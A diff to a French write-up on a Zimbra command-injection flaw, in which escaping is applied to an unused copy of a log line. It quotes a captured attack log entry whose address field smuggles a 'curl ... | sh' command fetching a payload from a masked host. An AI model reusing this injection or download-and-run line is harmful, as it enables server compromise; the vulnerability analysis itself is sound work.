@@ -119,9 +119,9 @@ Le problème : cette ligne échappe `$S_`, une **copie** de la ligne de log. Mai
 
 L'échappement existe. Il est correct. Il protège une variable qui n'est jamais utilisée dans la commande. C'est l'équivalent d'un casque posé sur le siège passager pendant que le conducteur roule sans ceinture.
 
-## La preuve sur le serveur : zmswatch.out ligne 880
+## La preuve sur le serveur : zmswatch.out
 
-Et il est assez marrant de faire tourner un zimbra sur cette version et voir des attaques en temps réel. Et en attendant un peu, on trouve des lignes zympatiques dans `/opt/zimbra/log/zmswatch.out` :
+Et il est assez marrant de faire tourner un zimbra sur cette version et voir des attaques en temps réel. Et en attendant un peu, on trouve des lignes sympatiques dans `/opt/zimbra/log/zmswatch.out` :
 
 ```
 880:SNMP notification: Aug 26 03:55:34 mail postfix/smtpd[61594]: warning: Illegal address syntax ... <x: Service status change: localhost x;curl -s http://XX.XX.XX.XX/.../ksmd | sh; ...>
